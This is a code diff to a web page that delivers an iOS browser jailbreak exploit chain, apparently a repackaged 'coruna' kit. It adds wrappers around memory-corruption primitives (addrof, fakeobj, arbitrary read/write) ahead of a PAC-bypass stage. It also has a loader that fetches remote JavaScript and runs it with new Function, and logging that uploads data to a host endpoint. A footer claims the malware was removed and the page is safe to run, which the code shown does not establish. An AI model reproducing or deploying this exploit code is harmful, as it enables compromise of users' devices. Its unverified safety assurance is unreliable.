@@ -99,6 +99,8 @@
             color: #888;
             line-height: 1.6;
             scrollbar-width: none;
+            user-select: text;
+            -webkit-user-select: text;
         }
 
         .log-area::-webkit-scrollbar { display: none; }
@@ -129,6 +131,7 @@
 
         .go-btn:active { transform: scale(0.97); }
         .go-btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+
 
         .progress-bar {
             margin-top: 16px;
@@ -273,11 +276,23 @@
             <div class="log-area" id="logArea"></div>
         </div>
 
+        <div class="status-card" style="margin-top: 20px;">
+            <div class="status-header">
+                <div class="status-dot waiting"></div>
+                <div class="status-text">Local log manager</div>
+            </div>
+            <div class="log-area" id="serverLogArea"></div>
+            <div style="margin-top:12px; display:flex; gap:10px;">
+                <button class="go-btn" id="downloadLogBtn" type="button">Download logs</button>
+                <button class="go-btn" id="clearLogBtn" type="button">Clear logs</button>
+            </div>
+        </div>
+
         <div class="progress-bar" id="progressBar">
             <div class="progress-fill" id="progressFill"></div>
         </div>
 
-        <button class="go-btn" id="goBtn" onclick="startExploit()">Go</button>
+        <button class="go-btn" id="goBtn" onclick="startExploit()">jelbrek me</button>
 
         <div class="divider"></div>
 
@@ -305,6 +320,11 @@
                 <a class="credit-tag" href="https://github.com/hrtowii" target="_blank">hrtowii</a>
                 <a class="credit-tag" href="https://github.com/dlevi309" target="_blank">daniel</a>
             </div>
+        </div>
+
+        <div style="margin-top:16px; padding:12px 16px; font-size:12px; color:#888; line-height:1.5; text-align:center;">
+            We've reverse engineered and removed all the malware components &mdash; it's safe to run.<br>
+            Source: <a href="https://github.com/khanhduytran0/coruna" target="_blank" style="color:#a8b4f0;">github.com/khanhduytran0/coruna</a>
         </div>
 
         <div class="footer">
@@ -340,6 +360,7 @@
 
         var exploitStarted = false;
         var progressValue = 0;
+        var logSyncScheduled = false;
 
         function setStatus(text, state) {
             document.getElementById('statusText').textContent = text;
@@ -366,7 +387,182 @@
             line.textContent = text;
             area.appendChild(line);
             area.scrollTop = area.scrollHeight;
+            // Store logs locally so they survive reloads / offline use.
+            storeLocalLogLine(text);
+
+            // Error lines are synced immediately to reduce loss on tab crash/reload.
+            if (/error|exception|typeerror|abort|failed/i.test(String(text))) {
+                syncLocalLogsToHost();
+            }
         };
+
+        window.addEventListener('error', function (event) {
+            try {
+                const message = event && event.message ? event.message : 'unknown window error';
+                const source = event && event.filename ? event.filename : 'unknown source';
+                const line = event && typeof event.lineno === 'number' ? event.lineno : -1;
+                const column = event && typeof event.colno === 'number' ? event.colno : -1;
+                window.log('[GLOBAL] onerror: ' + message + ' @ ' + source + ':' + line + ':' + column);
+                if (event && event.error && event.error.stack) {
+                    window.log('[GLOBAL] stack: ' + event.error.stack);
+                }
+            } catch (_) {}
+        });
+
+        window.addEventListener('unhandledrejection', function (event) {
+            try {
+                const reason = event ? event.reason : null;
+                const message = reason && (reason.message || reason.toString) ? (reason.message || reason.toString()) : String(reason);
+                window.log('[GLOBAL] unhandledrejection: ' + message);
+                if (reason && reason.stack) {
+                    window.log('[GLOBAL] rejection stack: ' + reason.stack);
+                }
+            } catch (_) {}
+        });
+
+        function getLocalLogBuffer() {
+            try {
+                const raw = localStorage.getItem('coruna_log_buffer');
+                return raw ? JSON.parse(raw) : [];
+            } catch (e) {
+                return [];
+            }
+        }
+
+        function setLocalLogBuffer(buf) {
+            try {
+                localStorage.setItem('coruna_log_buffer', JSON.stringify(buf));
+            } catch (e) {
+                // ignore storage failures
+            }
+        }
+
+        function getSyncedIndex() {
+            const raw = localStorage.getItem('coruna_log_synced_index');
+            const parsed = raw ? parseInt(raw, 10) : 0;
+            return Number.isFinite(parsed) && parsed >= 0 ? parsed : 0;
+        }
+
+        function setSyncedIndex(value) {
+            const safe = value >= 0 ? value : 0;
+            localStorage.setItem('coruna_log_synced_index', String(safe));
+        }
+
+        function storeLocalLogLine(line) {
+            const buf = getLocalLogBuffer();
+            buf.push(line);
+            if (buf.length > 2000) buf.splice(0, buf.length - 2000);
+            setLocalLogBuffer(buf);
+            const synced = Math.min(getSyncedIndex(), buf.length);
+            setSyncedIndex(synced);
+            renderLocalLogs();
+
+            if (!logSyncScheduled) {
+                logSyncScheduled = true;
+                setTimeout(function () {
+                    logSyncScheduled = false;
+                    syncLocalLogsToHost();
+                }, 200);
+            }
+        }
+
+        function clearLocalLogs() {
+            setLocalLogBuffer([]);
+            setSyncedIndex(0);
+            renderLocalLogs();
+        }
+
+        function getPendingLogs() {
+            const buf = getLocalLogBuffer();
+            const synced = Math.min(getSyncedIndex(), buf.length);
+            return {
+                pending: buf.slice(synced),
+                total: buf.length,
+                synced: synced,
+            };
+        }
+
+        function getUploadEndpoints() {
+            const basePath = window.location.pathname.slice(0, window.location.pathname.lastIndexOf('/') + 1);
+            return [
+                basePath + 'log',
+                window.location.origin + basePath + 'log',
+                '/log'
+            ];
+        }
+
+        async function clearHostLogs() {
+            const endpoints = getUploadEndpoints();
+            for (const endpoint of endpoints) {
+                try {
+                    const res = await fetch(endpoint, { method: 'DELETE' });
+                    if (res.ok) {
+                        setSyncStatus('host logs cleared at ' + endpoint);
+                        return true;
+                    }
+                } catch (e) {
+                    // try next endpoint
+                }
+            }
+            setSyncStatus('failed to clear host logs');
+            return false;
+        }
+
+        function setSyncStatus(message) {
+            var localArea = document.getElementById('serverLogArea');
+            if (!localArea) return;
+            const logs = getLocalLogBuffer().join('\n');
+            localArea.textContent = logs + (logs ? '\n\n' : '') + '[SYNC] ' + message;
+            localArea.scrollTop = localArea.scrollHeight;
+        }
+
+        async function syncLocalLogsToHost() {
+            const state = getPendingLogs();
+            if (!state.pending.length) return;
+
+            const payload = JSON.stringify({ lines: state.pending });
+            const endpoints = getUploadEndpoints();
+            for (const endpoint of endpoints) {
+                try {
+                    const res = await fetch(endpoint, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: payload
+                    });
+                    if (!res.ok) {
+                        continue;
+                    }
+                    setSyncedIndex(state.total);
+                    setSyncStatus('uploaded ' + state.pending.length + ' lines to ' + endpoint);
+                    return;
+                } catch (e) {
+                    // try next endpoint
+                }
+            }
+
+            setSyncStatus('upload failed; buffered ' + state.pending.length + ' lines locally');
+        }
+
+        function renderLocalLogs() {
+            var localArea = document.getElementById('serverLogArea');
+            if (!localArea) return;
+            const local = getLocalLogBuffer();
+            localArea.textContent = local.join('\n');
+            localArea.scrollTop = localArea.scrollHeight;
+        }
+
+        function downloadLogs() {
+            const data = getLocalLogBuffer().join('\n');
+            const blob = new Blob([data], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'coruna_logs.txt';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
 
         window.addDownloadBinary = function(fileName, text) {
             var fileType = "application/octet-stream";
@@ -460,45 +656,54 @@
                 return e[M]
             }
 
+            // Helper functions exposed by the module manager.
+            // These are defined in the closure scope so they can be referenced safely
+            // without relying on `this` or the object being fully constructed.
+            async function getModuleByURL(moduleId) {
+                window.log("[LOADER] Loading module: " + moduleId + "...");
+                if (moduleId in e == !1 && moduleId in MM == !1) {
+                    let I = moduleId;
+                    I = moduleId;
+                    const N = await async function (M) {
+                        window.log("Loading " + M);
+                        return new Promise(((I, N) => {
+                            const D = new XMLHttpRequest;
+                            let g;
+                            const T = (M, I) => Math.floor(Math.random() * (I - M + 1)) + M;
+                            g = new URL((e.$) + (M));
+                            const c = Math.random().toString(36).slice(2, T(5, 10)), d = T(0, 1);
+                            g.searchParams.set(c, d),
+                                D.open("GET", g.toString(), !0),
+                                D.responseType = ([66, 83, 78, 66].map(x => String.fromCharCode(x ^ 54)).join("")),
+                                D.onreadystatechange = () => {
+                                    if (D.readyState === XMLHttpRequest.DONE)
+                                        if (200 === D.status) {
+                                            const M = D.response;
+                                            null === M || "" === M ? reject("") : I(M)
+                                        } else reject("")
+                                },
+                                D.send()
+                        }))
+                    }((I) + ".js");
+                    e[moduleId] = new Function(N)()
+                }
+                return c(moduleId)
+            }
+
+            function evalBase64Module(M, I) { M in e == !1 && (e[M] = new Function(atob(I))()) }
+
             return {
-                hPL3On: this.getModuleByName,
-                ZKvD0e: this.getModuleByURL,
-                fgPoij: this.evalBase64Module,
+                // NOTE: `this` is not bound here, so calling `this.getModuleByName` would be undefined.
+                // Use the locally-scoped functions directly to avoid runtime errors.
+                hPL3On: c,
+                ZKvD0e: getModuleByURL,
+                fgPoij: evalBase64Module,
                 setBaseUrl: function (M) { e.$ = M },
                 setSalt: function (M) { e.p = M },
                 getModuleByName: c,
-                getModuleByURL: async function (moduleId) {
-                    window.log("[LOADER] Loading module: " + moduleId + "...");
-                    if (moduleId in e == !1 && moduleId in MM == !1) {
-                        let I = moduleId;
-                        I = moduleId;
-                        const N = await async function (M) {
-                            window.log("Loading " + M);
-                            return new Promise(((I, N) => {
-                                const D = new XMLHttpRequest;
-                                let g;
-                                const T = (M, I) => Math.floor(Math.random() * (I - M + 1)) + M;
-                                g = new URL((e.$) + (M));
-                                const c = Math.random().toString(36).slice(2, T(5, 10)), d = T(0, 1);
-                                g.searchParams.set(c, d),
-                                    D.open("GET", g.toString(), !0),
-                                    D.responseType = ([66, 83, 78, 66].map(x => String.fromCharCode(x ^ 54)).join("")),
-                                    D.onreadystatechange = () => {
-                                        if (D.readyState === XMLHttpRequest.DONE)
-                                            if (200 === D.status) {
-                                                const M = D.response;
-                                                null === M || "" === M ? reject("") : I(M)
-                                            } else reject("")
-                                    },
-                                    D.send()
-                            }))
-                        }((I) + ".js");
-                        e[moduleId] = new Function(N)()
-                    }
-                    return c(moduleId)
-                },
+                getModuleByURL: getModuleByURL,
                 evalCode: function (M, I) { M in e == !1 && (e[M] = I()) },
-                evalBase64Module: function (M, I) { M in e == !1 && (e[M] = new Function(atob(I))()) },
+                evalBase64Module: evalBase64Module,
             };
         })();
 
@@ -614,7 +819,133 @@
                 throw Error("");
             })();
 
-            if (!platformModule.platformState.exploitPrimitive) throw Error("");
+            // Some Stage1 variants set the exploit primitive on a different field (e.g. Xn).
+            // Normalize by copying it into the well-known 'exploitPrimitive' slot.
+            if (!platformModule.platformState.exploitPrimitive && platformModule.platformState.Xn) {
+                platformModule.platformState.exploitPrimitive = platformModule.platformState.Xn;
+            }
+
+            // If Stage1 returns a primitive wrapper instance (type "z"), adapt it
+            // to the loader's expected interface (addrof/readInt64FromOffset/cleanup).
+            if (
+                platformModule.platformState.exploitPrimitive &&
+                platformModule.platformState.exploitPrimitive.constructor &&
+                platformModule.platformState.exploitPrimitive.constructor.name === "z"
+            ) {
+                const raw = platformModule.platformState.exploitPrimitive;
+                const toAddrNumber = (addr) => {
+                    if (typeof addr === 'number') return addr;
+                    if (typeof addr === 'bigint') return Number(addr);
+                    if (addr && typeof addr.ct === 'function') return addr.ct();
+                    if (addr && typeof addr.toNumber === 'function') return addr.toNumber();
+                    if (addr && typeof addr.it === 'number' && typeof addr.et === 'number') {
+                        return addr.it + (addr.et * 0x100000000);
+                    }
+                    return Number(addr);
+                };
+                const toBigInt64 = (value) => {
+                    if (typeof value === 'bigint') return value;
+                    if (value && typeof value.Dt === 'function') return value.Dt();
+                    if (value && typeof value.it === 'number' && typeof value.et === 'number') {
+                        return (BigInt(value.et >>> 0) << 32n) | BigInt(value.it >>> 0);
+                    }
+                    const asNumber = toAddrNumber(value);
+                    const lo = BigInt(asNumber >>> 0);
+                    const hi = BigInt((asNumber / 0x100000000) >>> 0);
+                    return (hi << 32n) | lo;
+                };
+                const toInt64Obj = (value) => {
+                    if (value instanceof utilityModule.Int64) return value;
+                    if (value && typeof value.it === 'number' && typeof value.et === 'number') {
+                        return new utilityModule.Int64(value.it >>> 0, value.et >>> 0);
+                    }
+                    const v = toBigInt64(value);
+                    const lo = Number(v & 0xffffffffn) >>> 0;
+                    const hi = Number((v >> 32n) & 0xffffffffn) >>> 0;
+                    return new utilityModule.Int64(lo, hi);
+                };
+                platformModule.platformState.exploitPrimitive = {
+                    addrof: (o) => raw.tr(o),
+                    fakeobj: (o) => raw.Mr(o),
+                    readInt64FromOffset: (addr) => {
+                        const base = toAddrNumber(addr);
+                        return new utilityModule.Int64(raw.br(base), raw.br(base + 4));
+                    },
+                    readInt64FromInt64: (addrInt64) => {
+                        return raw.Ur(toInt64Obj(addrInt64));
+                    },
+                    readRawBigInt: (addr) => {
+                        const base = toAddrNumber(addr);
+                        return new utilityModule.Int64(raw.br(base), raw.br(base + 4)).yt();
+                    },
+                    read32FromInt64: (addr) => {
+                        return raw.ir(toInt64Obj(addr));
+                    },
+                    read32: (addr) => {
+                        const base = toAddrNumber(addr);
+                        return raw.br(base);
+                    },
+                    readByte: (addr) => {
+                        const base = toAddrNumber(addr);
+                        return raw.Sr(base);
+                    },
+                    readString: (addr, length) => {
+                        const base = toAddrNumber(addr);
+                        return raw.Er(base, length);
+                    },
+                    readStringFromInt64: (addrInt64, length) => {
+                        return raw.Tr(toInt64Obj(addrInt64), length);
+                    },
+                    readDoubleAsPointer: (addr) => {
+                        const base = toAddrNumber(addr);
+                        return raw.Dr(base);
+                    },
+                    write32: (addr, value) => {
+                        const base = toAddrNumber(addr);
+                        raw.dr(base, value >>> 0);
+                    },
+                    writeInt64ToOffset: (addr, value) => {
+                        const base = toAddrNumber(addr);
+                        raw.Jr(base, toInt64Obj(value));
+                    },
+                    copyBigInt: (addr, value) => {
+                        const base = toAddrNumber(addr);
+                        raw.Jr(base, toInt64Obj(value));
+                    },
+                    cleanup: () => { /* no-op */ },
+                };
+            }
+
+            if (platformModule.platformState.exploitPrimitive) {
+                try {
+                    const p = platformModule.platformState.exploitPrimitive;
+                    window.log("[LOADER] exploitPrimitive type=" + (p && p.constructor ? p.constructor.name : typeof p));
+                    window.log("[LOADER] exploitPrimitive keys=" + Object.keys(p).join(", "));
+                    const requiredMethods = [
+                        'fakeobj', 'addrof', 'readInt64FromOffset', 'readInt64FromInt64', 'readRawBigInt',
+                        'read32', 'read32FromInt64', 'readByte', 'readString', 'readStringFromInt64',
+                        'readDoubleAsPointer', 'write32', 'writeInt64ToOffset', 'copyBigInt'
+                    ];
+                    const missingMethods = requiredMethods.filter((name) => typeof p[name] !== 'function');
+                    if (missingMethods.length) {
+                        window.log('[LOADER] exploitPrimitive missing methods: ' + missingMethods.join(', '));
+                    } else {
+                        window.log('[LOADER] exploitPrimitive interface check: OK');
+                    }
+                } catch (_e) {
+                    window.log("[LOADER] exploitPrimitive introspection failed: " + (_e && _e.message));
+                }
+            }
+
+            if (!platformModule.platformState.exploitPrimitive) {
+                window.log("[LOADER] ERROR: exploitPrimitive missing after Stage1");
+                window.log("[LOADER] platformState: " + JSON.stringify({
+                    runtime: platformModule.platformState.runtime,
+                    iOSVersion: platformModule.platformState.iOSVersion,
+                    versionFlags: platformModule.platformState.versionFlags
+                }));
+                throw new Error("Missing exploit primitive (platformState.exploitPrimitive is null)");
+            }
             setProgress(40);
             setStatus("Stage 2: PAC bypass...", "running");
 
@@ -687,12 +1018,44 @@
                     btn.textContent = 'Done';
                 }
             } catch (e) {
-                setStatus("Failed: " + (e.message || "unknown error"), "error");
+                // Ensure we capture useful error information even when `.message` is empty.
+                const errMsg = e && (e.message || e.toString()) || "unknown error";
+                setStatus("Failed: " + errMsg, "error");
+                window.log("[LOADER] Exception: " + errMsg);
+                if (e && e.stack) window.log("[LOADER] Stack: " + e.stack);
                 btn.textContent = 'Retry';
                 btn.disabled = false;
                 exploitStarted = false;
             }
         }
+
+        document.getElementById('downloadLogBtn').addEventListener('click', async function () {
+            await syncLocalLogsToHost();
+            downloadLogs();
+        });
+        document.getElementById('clearLogBtn').addEventListener('click', async function () {
+            clearLocalLogs();
+            await clearHostLogs();
+        });
+
+        renderLocalLogs();
+        syncLocalLogsToHost();
+
+        window.addEventListener('pagehide', function () {
+            const state = getPendingLogs();
+            if (!state.pending.length) return;
+            const payload = JSON.stringify({ lines: state.pending });
+            if (navigator.sendBeacon) {
+                const endpoints = getUploadEndpoints();
+                const body = new Blob([payload], { type: 'application/json' });
+                for (const endpoint of endpoints) {
+                    if (navigator.sendBeacon(endpoint, body)) {
+                        break;
+                    }
+                }
+            }
+        });
+
     </script>
 </body>
 
